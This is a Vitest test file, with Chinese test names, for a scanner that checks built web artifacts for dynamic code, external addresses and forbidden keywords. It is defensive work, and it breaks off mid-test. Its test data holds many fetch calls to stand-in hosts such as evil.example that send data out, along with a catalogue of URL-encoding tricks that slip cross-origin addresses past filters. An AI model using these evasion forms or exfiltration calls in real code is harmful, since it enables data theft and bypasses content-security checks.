import type { ArtifactPolicy } from './artifacts.ts'
import { describe, expect, it } from 'vitest'
import { checkFileTypes, checkTestOnlyArtifacts, checkTestOnlySources, classifyArtifact, isTestOnlySource, scanArtifacts } from './artifacts.ts'
import { ARTIFACT_POLICY } from './policy.ts'

const policy: ArtifactPolicy = {
  ...ARTIFACT_POLICY,
  allowedAddresses: [
    { address: 'http://www.w3.org/2000/svg', source: '样例', reason: 'SVG 的命名空间' },
    { address: 'http://www.w3.org/1999/xhtml', source: '样例', reason: 'XHTML 的命名空间' },
    { address: 'http://localhost', source: '样例', reason: '解析相对地址的基准' },
  ],
  globalThisProbeMax: 1,
}

function scan(content: string, path = 'assets/index.js') {
  return scanArtifacts([{ path, content }], policy)
}

function rules(content: string, path = 'assets/index.js'): string[] {
  return scan(content, path).violations.map(v => v.rule)
}

describe('US-M1-11 A01 产物扫描：动态代码', () => {
  it.each([
    ['eval(', 'eval("1+1")'],
    ['可选调用的 eval', 'eval?.(code)'],
    ['间接 eval', '(0, eval)("x")'],
    ['逗号表达式里的 eval', '(1,eval)(code)'],
    ['globalThis.eval', 'globalThis.eval(code)'],
    ['window.eval', 'window.eval(code)'],
    ['Worker 里的 self.eval', 'self.eval(code)'],
    ['用下标取 eval', 'window["eval"](code)'],
    ['new Function', 'new Function("return 1")'],
    ['new window.Function', 'new window.Function("x")'],
    ['不带 new 的 Function，参数是变量', 'var f=Function(code)();'],
    ['不带 new 的 Function，多个参数', 'Function(a,b)'],
    ['字符串 Function', 'Function("a","return a")'],
    ['经 constructor 取到 Function', '(function(){}).constructor("return 1")()'],
    ['字符串定时器', 'setTimeout("alert(1)", 10)'],
    ['字符串 setInterval', 'setInterval(\'tick()\', 10)'],
    ['window.setTimeout 的字符串参数', 'window.setTimeout("alert(1)",1)'],
    ['WebAssembly', 'WebAssembly.instantiate(bytes)'],
    ['用下标访问 WebAssembly', 'WebAssembly["instantiate"](b)'],
    ['内联 Worker（Blob）', 'new Worker(URL.createObjectURL(new Blob([atob(s)],{type:"text/javascript"})))'],
    ['内联 Worker（data URL）', 'new Worker("data:text/javascript;base64,AAAA")'],
  ])('违规：%s', (_case, code) => {
    expect(rules(code)).toContain('artifacts/dynamic-code')
  })

  it.each([
    ['先把 Function 赋给变量再 new（zod 源码里的写法）', 'let F=Function;new F(code)'],
    ['先把 Function 赋给变量再调用', 'const F=Function;F(code)()'],
    ['全局对象上的 Function 赋给变量', 'const F=globalThis.Function;F(code)()'],
    ['Reflect.construct 的参数', 'Reflect.construct(Function,[code])'],
    ['Function 的 apply', 'Function.apply(null,[code])'],
    ['eval 赋给变量', 'const e=eval;e(code)'],
    ['标签模板', 'Function`return 1`'],
    ['标识符里的转义', '\\u0065val(code)'],
  ])('违规（审查 B3）：%s', (_case, code) => {
    expect(rules(code)).toContain('artifacts/dynamic-code')
  })

  it.each([
    // Vite 压缩之后的原文（Codex 评审 CX11）：原来的写法匹配放过
    ['Reflect.get 取定时器', 'Reflect.get(globalThis,`setTimeout`)(`globalThis.codexGateProof = 1`,0);'],
    ['计算的字符串下标', 'globalThis["setTimeout"]("alert(1)", 0)'],
    ['逗号表达式', '(0,setTimeout)("alert(1)")'],
    ['.call', 'setTimeout.call(null,"alert(1)")'],
  ])('违规：JS 文件里以字符串为代码的定时器按语法树认（%s）', (_case, code) => {
    expect(rules(code)).toEqual(['artifacts/dynamic-code'])
  })

  it('JS 文件里直接调用的字符串定时器只报一次；没有语法树的文本文件仍按写法匹配定时器', () => {
    const { violations } = scan('setInterval(\'tick()\', 10)')
    expect(violations).toHaveLength(1)
    expect(violations[0]?.detail).toMatch(/^setInterval\('…'\)：/)
    expect(rules('<script>setTimeout("alert(1)",1)</script>', 'index.html')).toEqual(['artifacts/dynamic-code'])
    // JS 解析不了时同样按写法匹配
    expect(rules('setTimeout("x"); let y = ;')).toEqual(['artifacts/unparsable', 'artifacts/dynamic-code'])
  })

  it('没有语法树的文本文件（HTML 等）仍按写法匹配 eval 与 Function', () => {
    expect(rules('<script>eval(x)</script>', 'index.html')).toContain('artifacts/dynamic-code')
    expect(rules('<svg onload="new Function(x)()"></svg>', 'assets/logo.svg')).toContain('artifacts/dynamic-code')
    expect(rules('<p>Function("return this")</p>', 'index.html')).toEqual([])
  })

  it('违规：JS 文件解析失败时不当作没有动态代码', () => {
    expect(rules('let x = ;')).toEqual(['artifacts/unparsable'])
  })

  it('合规：常见的正常写法不误报', () => {
    const code = [
      // 任何对象上名为 eval、Function 的属性都算引用（复验 R5），这里只有名字相近的
      'a.evaluate(x);b.myFunction("x");obj.eval2=1;isFunction("x");',
      'typeof f==="function";x instanceof Function;Function.prototype.call.bind(f);',
      'const tag="[object Function]";const kinds=["AsyncFunction","GeneratorFunction"];',
      'setTimeout(fn,0);self.setTimeout(()=>{},1);',
      'new Worker(new URL("./formula.worker-abc.js",import.meta.url),{type:"module"});',
      'var s="//";var t="a//b";',
    ].join('\n')
    expect(rules(code)).toEqual([])
  })

  it('合规：全局对象探测在允许的次数以内；超过即违规', () => {
    expect(rules('var g=Function("return this")();')).toEqual([])
    expect(rules('Function("return this")();Function(\'return this\')();')).toEqual(['artifacts/global-this-probe'])
  })

  it('已登记的 zod JIT 探测（空字符串的 Function）：次数以内不算动态代码，超过上限即违规；带内容的、先赋给变量的仍是动态代码', () => {
    expect(rules('var L=jo(()=>{if(zs.jitless)return!1;try{return Function(``),!0}catch{return!1}})')).toEqual([])
    expect(rules('Function(``);Function(\'\')')).toEqual(['artifacts/known-dynamic-code'])
    expect(rules('Function(`x`)')).toContain('artifacts/dynamic-code')
    expect(rules('new Function(``+code)')).toContain('artifacts/dynamic-code')
    // 登记的是压缩后的原文 Function(``)；源码里先赋给变量的写法不在登记范围里（审查 B3）
    expect(rules('const F=Function;try{new F("")}catch{}')).toContain('artifacts/dynamic-code')
  })

  // 生产产物里 zod 的 Doc.compile 原文（压缩后）
  // eslint-disable-next-line no-template-curly-in-string -- 样例是产物原文，不是要插值
  const zodCompiler = 'var pl=class{compile(){let e=Function,t=this?.content??[``];return new e(...Object.keys(this.closed),`return function (${this.args.join(`, `)}) {\\n${t.join(`\n`)}\\n};`)(...Object.values(this.closed))}};'

  it('已登记的 zod JIT 编译器：原文以内不算动态代码，并计数；出现两次即违规；别处把 Function 赋给变量仍然违规', () => {
    const scan = scanArtifacts([{ path: 'assets/index.js', content: zodCompiler }], policy)
    expect(scan.violations).toEqual([])
    expect(scan.knownDynamicCode).toEqual(new Map([['zod 的 JIT 探测', 0], ['zod 的 JIT 编译器', 1]]))
    expect(rules(zodCompiler + zodCompiler.replace('pl=', 'pm='))).toEqual(['artifacts/known-dynamic-code'])
    expect(rules('var pl=class{compile(){let e=Function;return e(this.code)}};')).toContain('artifacts/dynamic-code')
  })

  it('没有登记时，zod 的 JIT 编译器报为动态代码（审查 B3：P1 起漏检）', () => {
    const unregistered = { ...policy, knownDynamicCode: policy.knownDynamicCode.filter(known => known.name !== 'zod 的 JIT 编译器') }
    const { violations } = scanArtifacts([{ path: 'assets/index.js', content: zodCompiler }], unregistered)
    expect(violations.map(v => v.rule)).toEqual(['artifacts/dynamic-code'])
    expect(violations[0]?.detail).toContain('let e=Function')
  })
})

describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
  it.each([
    ['https', 'fetch("https://evil.example.com/collect?x=1")'],
    ['大写的协议', 'fetch("HTTPS://EVIL.EXAMPLE.COM/x")'],
    ['wss', 'new WebSocket("wss://t.example.com/s")'],
    ['协议相对地址', 'fetch("//evil.example.com/collect")'],
    ['JSON 转义的斜杠', 'JSON.parse("{\\"u\\":\\"https:\\\\/\\\\/evil.example.com\\"}")'],
  ])('违规：%s', (_case, code) => {
    expect(rules(code)).toContain('artifacts/address')
  })

  it('违规：CSS 里的外部地址', () => {
    expect(rules('body{background:url(https://cdn.example.net/bg.png)}', 'assets/x.css')).toEqual(['artifacts/address'])
  })

  it('违规：解析不了的主机照样报出，原样记进主机汇总', () => {
    const result = scan('fetch("https://exa%mple.com/x")')
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['exa%mple.com'])
  })

  /* eslint-disable no-template-curly-in-string -- 以下样例都是产物里的模板字符串原文，不是要插值 */
  it.each([
    ['查询里的插值', 'fetch(`https://tracker.example.com/collect?u=${user}`)', 'tracker.example.com'],
    ['路径里的插值', 'img.src=`https://evil.example/${id}.gif`', 'evil.example'],
    ['WebSocket 路径里的插值', 'new WebSocket(`wss://t.example.com/s/${room}`)', 't.example.com'],
    ['主机以插值开头、后面是固定的域名', 'fetch(`https://${region}.tracker.example.com/e`)', '*.tracker.example.com'],
    ['用户信息是插值、主机固定', 'fetch(`https://${key}@o1.ingest.example.io/1`)', 'o1.ingest.example.io'],
  ])('违规（审查 B2）：主机固定、插值在后面时，按主机检查：%s', (_case, code, host) => {
    const result = scan(code)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual([host])
  })

  it('合规：主机本身在运行时拼出（插值紧跟在 // 或 //[ 之后），看不到主机，由 CSP 兜底，单独计数', () => {
    const result = scan('function Ul(e){return Sl(`http://[${e}]`)};const u=`https://${host}/x`;const w=`wss://${host}:${port}/ws`')
    expect(result.violations).toEqual([])
    expect(result.hosts).toEqual(new Map())
    expect(result.runtimeHosts).toBe(3)
  })

  it('违规：主机或端口里有插值时，允许清单不适用（实际的地址不止这段固定部分）', () => {
    expect(rules('const a=`http://localhost${suffix}`')).toEqual(['artifacts/address'])
    expect(rules('const a=`http://localhost:${port}`')).toEqual(['artifacts/address'])
  })

  it('合规：允许清单里的地址后面拼上路径（与字符串拼接的写法一样）', () => {
    const code = 'function n(e){return`https://react.dev/errors/${e}`}function m(e){return`https://react.dev/errors/`+e}'
    expect(scanArtifacts([{ path: 'assets/index.js', content: code }], ARTIFACT_POLICY).violations).toEqual([])
  })
  /* eslint-enable no-template-curly-in-string */

  it('合规：允许清单里的地址（协议与主机不区分大小写，句末的句点不算，JSON 转义的斜杠也认得）', () => {
    expect(rules('const ns="http://www.w3.org/2000/svg";const x="HTTP://WWW.W3.ORG/1999/xhtml";const m="See http://localhost."')).toEqual([])
    expect(rules('const j="{\\"ns\\":\\"http:\\\\/\\\\/www.w3.org\\\\/2000\\\\/svg\\"}"')).toEqual([])
  })

  it.each([
    ['同一个主机上的其他地址', 'fetch("http://www.w3.org/collect?id=1")'],
    ['协议不同', 'const ns="https://www.w3.org/2000/svg"'],
    ['路径区分大小写', 'const ns="http://www.w3.org/1999/XHTML"'],
    ['登记的地址后面加上路径', 'fetch("http://localhost/api/collect")'],
    ['登记的地址加上端口', 'fetch("http://localhost:8080")'],
  ])('违规（审查 B21）：按具体地址放行，不按主机：%s', (_case, code) => {
    expect(rules(code)).toEqual(['artifacts/address'])
  })

  /* eslint-disable no-template-curly-in-string -- 以下样例是产物里的模板字符串原文，不是要插值 */
  it.each([
    ['协议由插值给出', 'fetch(`${location.protocol}//evil.example/collect`)', 'evil.example'],
    ['拼接出的地址（转义的斜杠）', 'fetch("https:"+"\\/\\/evil.example/c")', 'evil.example'],
    ['协议相对的本机地址', 'fetch("//localhost:3000/api")', 'localhost:3000'],
    ['协议相对的 IP 地址', 'new Image().src="//10.0.0.8/p.gif"', '10.0.0.8'],
    ['协议相对的 IPv6 地址', 'fetch("//[::1]:8080/x")', '[::1]:8080'],
    ['Unicode 转义的斜杠', 'fetch("https:\\u002F\\u002Fevil.example")', 'evil.example'],
    ['正则里的地址', 'const r=/https:\\/\\/evil\\.example/', 'evil.example'],
  ])('违规（DEF-016）：按语法树取出的值识别地址：%s', (_case, code, host) => {
    const result = scan(code)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual([host])
  })
  /* eslint-enable no-template-curly-in-string */

  it.each([
    ['两个斜杠的注释样式的字符串', 'const c="// 说明"'],
    ['只有两个斜杠', 'const p=a+"//"+b'],
    ['源码映射的注释', 'const s="//# sourceMappingURL=x.js.map"'],
    ['路径里的两个斜杠', 'const p="a//b.example"'],
    ['注释里的协议相对写法', '/* //evil.example */ const a=1'],
  ])('合规：不是地址的写法不误报：%s', (_case, code) => {
    expect(rules(code)).toEqual([])
  })

  it('注释里的绝对地址照样报出', () => {
    expect(rules('/*! see https://evil.example/license */ const a=1')).toEqual(['artifacts/address'])
  })

  it('前缀的登记只适用于指定的文件（编辑器的产物）：以它开头的地址放行；其他文件（默认）照旧违规', () => {
    const prefixed: ArtifactPolicy = { ...policy, allowedAddresses: [{ address: 'https://support.example.com/docs/', prefix: true, source: '样例', reason: '公式帮助的链接' }] }
    const code = 'a={url:"https://support.example.com/docs/sum-function"};b="https://support.example.com/other"'
    const editor = scanArtifacts([{ path: 'assets/editor.js', content: code }], prefixed, { prefixFiles: new Set(['assets/editor.js']) })
    expect(editor.violations.map(v => v.detail.split(' ')[0])).toEqual(['https://support.example.com/other'])
    expect(editor.unusedAddresses).toEqual([])
    const platform = scanArtifacts([{ path: 'assets/index.js', content: code }], prefixed)
    expect(platform.violations).toHaveLength(2)
    expect(platform.unusedAddresses).toEqual(['https://support.example.com/docs/'])
  })

  it.each([
    ['反斜杠', 'location.href="\\\\\\\\evil.example/x"'],
    ['斜杠加反斜杠', 'location.href="/\\\\evil.example/x"'],
    ['协议之后是反斜杠', 'fetch("https:\\\\\\\\evil.example/x")'],
    ['前导空格', 'fetch(" //evil.example/x")'],
    ['斜杠中间夹制表符', 'fetch("/\t/evil.example/x")'],
    ['用户信息', 'fetch("//u@evil.example/x")'],
    ['主机里的百分号编码', 'fetch("//%65vil.example/x")'],

    ['全角字符的主机', 'fetch("//ｅｖｉｌ.example/x")'],
    ['协议之后不带斜杠', 'new WebSocket("wss:evil.example/x")'],
  ])('违规（审查 A4）：浏览器会解析成跨源地址的写法：%s', (_case, code) => {
    const result = scan(code)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['evil.example'])
  })

  it('违规（审查 A4）：非 ASCII 的主机按浏览器的规则转成 ASCII（punycode）报出', () => {
    const result = scan('fetch("//évil.example/x")')
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['xn--vil-9la.example'])
  })

  it.each([
    ['样式的 url() 不带引号', 'a{background:url(//evil.example/a.png)}', 'assets/x.css'],
    ['样式的 @import url()', '@import url(//evil.example/a.css);', 'assets/x.css'],
    ['HTML 属性不带引号', '<img src=//evil.example/a.png>', 'index.html'],
  ])('违规（审查 A4）：%s里的协议相对地址', (_case, content, path) => {
    expect(rules(content, path)).toEqual(['artifacts/address'])
  })

  // 压缩器把普通字符串也写成模板字符串（复验 RA2）
  /* eslint-disable no-template-curly-in-string -- 以下样例是产物里的模板字符串原文，不是要插值 */
  it.each([
    ['前导空格', 'fetch(` //evil.example/x`)'],
    ['前导空格与插值', 'fetch(` //evil.example/${a}`)'],
    ['反斜杠与插值', 'fetch(`\\\\\\\\evil.example/${a}`)'],
    ['协议之后是反斜杠', 'fetch(`https:\\\\\\\\evil.example/${a}`)'],
    ['协议之后不带斜杠', 'new WebSocket(`wss:evil.example/${a}`)'],
    ['用户信息', 'fetch(`//u@evil.example/${a}`)'],
    ['主机里的百分号编码', 'fetch(`//%65vil.example/${a}`)'],
    ['全角字符的主机', 'fetch(`//ｅｖｉｌ.example/${a}`)'],
    ['斜杠中间夹制表符', 'fetch(`/\t/evil.example/${a}`)'],
    ['插值给出协议、之后是反斜杠', 'fetch(`${p}\\\\\\\\evil.example/x`)'],
    ['插值给出协议、之后是用户信息', 'fetch(`${p}//u@evil.example/x`)'],
  ])('违规（复验 RA2）：模板字符串里浏览器会解析成跨源地址的写法：%s', (_case, code) => {
    const result = scan(code)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['evil.example'])
  })

  it('合规（复验 RA2）：模板字符串里主机本身是插值的写法，单独计数', () => {
    const result = scan('fetch(` //${host}/x`);fetch(`\\\\\\\\${host}/x`)')
    expect(result.violations).toEqual([])
    expect(result.runtimeHosts).toBe(2)
  })
  /* eslint-enable no-template-curly-in-string */

  it.each([
    ['单标签的主机', 'fetch("//intranet/x")', 'intranet'],
    ['只有单标签的主机', 'fetch("//intranet")', 'intranet'],
    ['单标签的主机与默认端口', 'fetch("//nas:443/x")', 'nas'],
    ['反斜杠与单标签的主机', 'fetch("\\\\\\\\intranet/x")', 'intranet'],
    ['new URL 的协议相对写法', 'new URL("//evil",location.href)', 'evil'],
    ['协议之后是反斜杠、单标签的主机', 'fetch("https:\\\\\\\\intranet/x")', 'intranet'],
    ['协议之后不带斜杠、单标签的主机', 'new WebSocket("wss:intranet/x")', 'intranet'],
    ['https 页面上跨协议、只有一个斜杠', 'fetch("http:/evil.example/x")', 'evil.example'],
    ['十进制的 IPv4', 'fetch("//2130706433/x")', '127.0.0.1'],
  ])('违规（复验 RA3）：不像域名的主机同样会被请求：%s', (_case, code, host) => {
    const result = scan(code)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual([host])
  })

  it.each([
    ['同协议、不带斜杠（https 页面上是相对地址）', 'fetch("https:evil.example/x")'],
    ['开头是 U+FEFF（浏览器不去掉，是相对地址）', 'fetch("\\uFEFF//evil.example/x")'],
    ['正则片段解析出的名字查不到地址', 'const r=`\\\\/*$`;const s="//(.+)"'],
  ])('合规（复验 RA3）：不是跨源地址：%s', (_case, code) => {
    expect(rules(code)).toEqual([])
  })

  it.each([
    ['url() 里转义的斜杠', 'a{background:url(\\/\\/evil.example/a.png)}'],
    ['url() 里斜杠加转义的斜杠', 'a{background:url(/\\/evil.example/a.png)}'],
    ['url() 里两个反斜杠', 'a{background:url(\\\\\\\\evil.example/a.png)}'],
    ['十六进制的转义', 'a{background:url("\\2f\\2f evil.example/a.png")}'],
    ['@import 的引号里有前导空格', '@import " //evil.example/a.css";'],
    ['image-set 的引号里有前导空格', 'a{background-image:image-set(" //evil.example/a.png" 1x)}'],
    ['https 页面上跨协议、不带斜杠', 'a{background:url(http:evil.example/a.png)}'],
    ['url() 的引号与空白', 'a{background:url( "//evil.example/a.png" )}'],
  ])('违规（复验 RA4）：样式里的写法：%s', (_case, css) => {
    const result = scan(css, 'assets/x.css')
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['evil.example'])
  })

  it.each([
    ['十六进制的字符引用', '<img src="&#x2f;&#x2f;evil.example/a.png">', 'index.html'],
    ['命名的字符引用', '<img src="&sol;&sol;evil.example/a.png">', 'index.html'],
    ['协议里的字符引用', '<img src="https&colon;//evil.example/a.png">', 'index.html'],
    ['反斜杠', '<img src="\\\\evil.example/a.png">', 'index.html'],
    ['引号里有前导空格', '<img src=" //evil.example/a.png">', 'index.html'],
    ['大写的属性名、等号两边有空格', '<img SRC = //evil.example/a.png>', 'index.html'],
    ['srcset 的第二个候选', '<img src="a.png" srcset="a.png 1x, //evil.example/b.png 2x">', 'index.html'],
    ['style 属性里的 url()', '<div style="background:url(&quot;//evil.example/a.png&quot;)"></div>', 'index.html'],
    ['style 元素', '<style>a{background:url(\\/\\/evil.example/a.png)}</style>', 'index.html'],
    ['meta refresh', '<meta http-equiv="refresh" content="0;url= //evil.example/x">', 'index.html'],
    ['SVG 的十进制字符引用', '<svg xmlns="http://www.w3.org/2000/svg"><image href="&#47;&#47;evil.example/a.png"/></svg>', 'assets/a.svg'],
  ])('违规（复验 RA4）：HTML 与 SVG 里的写法：%s', (_case, content, path) => {
    const result = scan(content, path)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()].filter(host => host !== 'www.w3.org')).toEqual(['evil.example'])
  })

  it('合规（复验 RA4）：HTML 里本站的地址与允许清单里的命名空间；同一处不重复计数', () => {
    const result = scan('<html xmlns="http://www.w3.org/1999/xhtml"><link rel="icon" href="/favicon.ico"><script type="module" src="/assets/index.js"></script></html>', 'index.html')
    expect(result.violations).toEqual([])
    expect([...result.hosts]).toEqual([['www.w3.org', 1]])
  })

  it('违规（复验 RA4）：JSON 里的字符串按值识别', () => {
    const result = scan('{"endpoint":" //evil.example/x","ok":"/api"}', 'assets/config.json')
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['evil.example'])
  })

  it.each([
    ['正则片段里的两个斜杠', 'const a="//g";const b="//i"'],
    ['正则的原文字符串', 'new RegExp("\\\\d+\\\\s*")'],
    ['相对路径', 'fetch("/api/x");const c="./a//b"'],
    ['只有协议', 'const p="https:";const q="http:"'],
    ['拼接用的协议与斜杠', 'const u="https://"+host'],
  ])('合规：不是跨源地址的写法不误报：%s', (_case, code) => {
    expect(rules(code)).toEqual([])
  })

  it.each(['Sentry.init({dsn:d})', 'new PostHog()', 'o.license_key="x"', 'o.licenseKey="x"', 'import("@univerjs-pro/license")', 'https://www.googletagmanager.com/gtag/js'])('违规：关键字（不区分大小写）%s', (code) => {
    expect(rules(code)).toContain('artifacts/keyword')
  })

  it.each([
    ['测试构建里的写法', 'const e="nerve-office.editor-selftest.v1";function t(n){return{format:e,scenario:n}}'],
    ['大小写不同', 'x="Nerve-Office.Editor-Selftest.v2"'],
  ])('违规：页面自检结果的格式标识出现在生产产物里（M3-P2 设计 §3.5）：%s', (_case, code) => {
    const result = scan(code)
    expect(result.violations.map(v => [v.rule, v.subject])).toEqual([['artifacts/keyword', 'nerve-office.editor-selftest']])
  })

  it.each([
    ['测试构建里的写法', 'let n={univerAPI:e,snapshot:()=>JSON.stringify(t.save())};window.__nerveEditorProbe=n'],
    ['方括号访问', 'window["__nerveEditorProbe"]=n'],
    ['大小写不同', 'self.__NERVEEDITORPROBE=n'],
  ])('违规：编辑器的 E2E 探针的名字出现在生产产物里（M2-P3 设计 §3.7）：%s', (_case, code) => {
    const result = scan(code)
    expect(result.violations.map(v => [v.rule, v.subject])).toEqual([['artifacts/keyword', '__nerveEditorProbe']])
  })

  it('汇总出现过的主机与允许清单里这次没出现的地址，便于审查允许清单', () => {
    const result = scan('a="http://www.w3.org/1999/xhtml";b="http://www.w3.org/2000/svg"')
    expect(result.hosts).toEqual(new Map([['www.w3.org', 2]]))
    expect(result.unusedAddresses).toEqual(['http://localhost'])
  })

  it.each([
    ['style 属性里两个 url()', '<div style="background:url(http://www.w3.org/2000/svg),url(http://www.w3.org/evil-a1.png)"></div>', 'index.html'],
    ['srcset 的两个候选', '<img srcset="http://www.w3.org/2000/svg 2x, http://www.w3.org/evil-a2.png 1x">', 'index.html'],
    ['srcdoc 里的两个 img', '<iframe srcdoc="&lt;img src=http://www.w3.org/2000/svg&gt;&lt;img src=http://www.w3.org/evil-a3.png&gt;"></iframe>', 'index.html'],
    ['JSON 的一个字符串里两个地址', '{"a":"http://www.w3.org/2000/svg http://www.w3.org/evil-a4"}', 'assets/a.json'],
    ['两个 xlink:href（第二个用字符引用写斜杠）', '<svg><use xlink:href="http://www.w3.org/2000/svg"/><use xlink:href="http:&#47;&#47;www.w3.org/evil-a5"/></svg>', 'index.html'],
  ])('违规（复验 TA1）：同一处里允许的地址排在前面，同一来源的其他地址照样核对：%s', (_case, content, path) => {
    // 整个值当作一个地址时、字符引用让写法匹配多出来的（…/svg&gt）也报出：宁可多报
    const result = scan(content, path)
    expect(new Set(result.violations.map(v => v.rule))).toEqual(new Set(['artifacts/address']))
    expect(result.violations.map(v => v.detail.split(' ')[0])).toContainEqual(expect.stringMatching(/^http:\/\/www\.w3\.org\/evil-a\d(?:\.png)?$/))
  })

  it.each([
    ['select 里的 img', '<select><img src=//evil.example/d1.png></select>'],
    ['select 里 div 的 style', '<select><div style="background:url(//evil.example/d2.png)">x</div></select>'],
  ])('违规（复验 TA2）：树构建丢掉的开始标签里的地址：%s', (_case, content) => {
    const result = scan(content, 'index.html')
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['evil.example'])
  })

  it('违规（复验 TA2）：原始文本元素的开始标签被丢掉，之后怎样分词无法确定：直接报出', () => {
    expect(rules('<select><style>/* <!-- */</style><img src=//evil.example/x.png><!-- --></select>', 'index.html')).toContain('artifacts/markup')
  })

  it.each([
    ['style 属性以反斜杠结尾', '<div style="background:url(//evil.example/h1.png\\"></div>', 'index.html'],
    ['样式文件以反斜杠结尾', 'a{background:url(//evil.example/h2.png\\', 'assets/x.css'],
    ['url() 里的 NUL', 'a{background:url(//evil.example/n1\0.png)}', 'assets/x.css'],
  ])('违规（复验 TA3）：按 CSS 的预处理与转义规则认出的地址：%s', (_case, content, path) => {
    const result = scan(content, path)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['evil.example'])
  })

  it('违规（复验 TA4）：IPv6 的 [::]', () => {
    const result = scan('fetch("\\\\\\\\[::]:8080/e3")')
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()]).toEqual(['[::]:8080'])
  })

  it.each([
    ['制表符与 ../', 'const a="http://www.w3.org/2000/svg\t/../../evil-c1"', 'assets/index.js', 'http://www.w3.org/evil-c1'],
    ['空白与别的路径', 'const a="http://www.w3.org/2000/svg (evil-c2)"', 'assets/index.js', 'http://www.w3.org/2000/svg%20(evil-c2)'],
    ['样式里的 \\9', 'a{b:url("http://www.w3.org/2000/svg\\9/../../evil-c6")}', 'assets/x.css', 'http://www.w3.org/evil-c6'],
    ['HTML 里的 &#9;', '<img src="http://www.w3.org/2000/svg&#9;/../../evil-c7">', 'index.html', 'http://www.w3.org/evil-c7'],
  ])('违规（复验 TA5）：允许的地址后面接着浏览器会去掉或编码的字符与别的路径：%s', (_case, content, path, requested) => {
    const result = scan(content, path)
    expect(new Set(result.violations.map(v => v.rule))).toEqual(new Set(['artifacts/address']))
    expect(result.violations.map(v => v.detail.split(' ')[0])).toContain(requested)
  })

  it.each([
    ['../ 跳出前缀', 'a="https://support.example.com/docs/../../../evil-c3"', 'https://support.example.com/evil-c3'],
    ['%2e%2e 跳出前缀', 'a="https://support.example.com/docs/%2e%2e/evil-c4"', 'https://support.example.com/evil-c4'],
    ['结尾的 ..（复验 UA2）', 'a="https://support.example.com/docs/.."', 'https://support.example.com/'],
    ['结尾的 %2e.（复验 VA1）', 'a="https://support.example.com/docs/%2e."', 'https://support.example.com/'],
    ['结尾的 %2E.（复验 VA1）', 'a="https://support.example.com/docs/%2E."', 'https://support.example.com/'],
  ])('违规（复验 TA5）：前缀按浏览器化简之后的路径比较：%s', (_case, code, requested) => {
    const prefixed: ArtifactPolicy = { ...policy, allowedAddresses: [{ address: 'https://support.example.com/docs/', prefix: true, source: '样例', reason: '公式帮助的链接' }] }
    const result = scanArtifacts([{ path: 'assets/editor.js', content: code }], prefixed, { prefixFiles: new Set(['assets/editor.js']) })
    expect(result.violations.map(v => v.detail.split(' ')[0])).toEqual([requested])
  })

  it.each([
    ['结尾的 ..（跳到上一层）', 'const a="http://www.w3.org/2000/svg/.."', 'http://www.w3.org/2000/'],
    ['结尾的两个句点（路径的一部分）', 'const a="http://www.w3.org/2000/svg.."', 'http://www.w3.org/2000/svg..'],
  ])('违规（复验 UA2）：结尾的 .. 不当作句末的句点去掉：%s', (_case, code, requested) => {
    expect(scan(code).violations.map(v => v.detail.split(' ')[0])).toEqual([requested])
  })

  it.each([
    ['HTML 里 SVG 的样式被注释拆开', '<svg><style>@import u<!---->rl(//evil.example/b1.css);</style></svg>', 'index.html'],
    ['SVG 文件的样式被注释拆开', '<svg xmlns="http://www.w3.org/2000/svg"><style>@import u<!---->rl(//evil.example/b3.css);</style></svg>', 'assets/a.svg'],
    ['SMIL 的 values 按分号分隔', '<svg xmlns="http://www.w3.org/2000/svg"><animate attributeName="href" values="/ok.png;//evil.example/e1.png"/></svg>', 'assets/a.svg'],
  ])('违规（复验 TA6）：%s', (_case, content, path) => {
    const result = scan(content, path)
    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
    expect([...result.hosts.keys()].filter(host => host !== 'www.w3.org')).toEqual(['evil.example'])
  })

  it.each([
    ['DTD 里定义的实体', '<!DOCTYPE svg [<!ENTITY e "&#47;&#47;evil.example/f1.css">]><svg><style>@import url(&e;);</style></svg>'],
    ['xml-stylesheet', '<?xml-stylesheet href="&#47;&#47;evil.example/x.css"?><svg/>'],
    ['格式不正确', '<svg><g></svg>'],
  ])('违规（复验 TA6）：SVG 文件里门禁无法确定的写法直接报出：%s', (_case, content) => {
    expect(rules(content, 'assets/a.svg')).toContain('artifacts/markup')
  })

  it.each([
    ['HTML 属性', (n: number) => '<img src="http://www.w3.org/2000/svg">'.repeat(n), 'index.html'],
    ['带地址的 JSON 字符串', (n: number) => JSON.stringify(Array.from({ length: n }).fill('http://www.w3.org/2000/svg')), 'assets/a.json'],
    ['样式的 url()', (n: number) => 'a{b:url(http://www.w3.org/2000/svg)}'.repeat(n), 'assets/x.css'],
    ['SVG 样式里的 url()', (n: number) => `<svg><style>${'a{b:url(http://www.w3.org/2000/svg)}'.repeat(n)}</style></svg>`, 'assets/a.svg'],
  ])('不是平方级（复验 TA7）：%s', (_case, build, path) => {
    // 按这个线程用掉的 CPU 时间计（process.threadCpuUsage，毫秒），不按墙上时间：机器忙时等 CPU 的时间不算进去，比值不受别的进程
    // 抢 CPU 的影响。墙上时间在两路子 Agent 同时跑 E2E 与集成测试时实测到 88 倍（M3-P3），超过下面的上限；扫描是同步的，
    // 全在这个线程上，与测试池用进程还是线程无关
    const once = (content: string): number => {
      const start = process.threadCpuUsage()
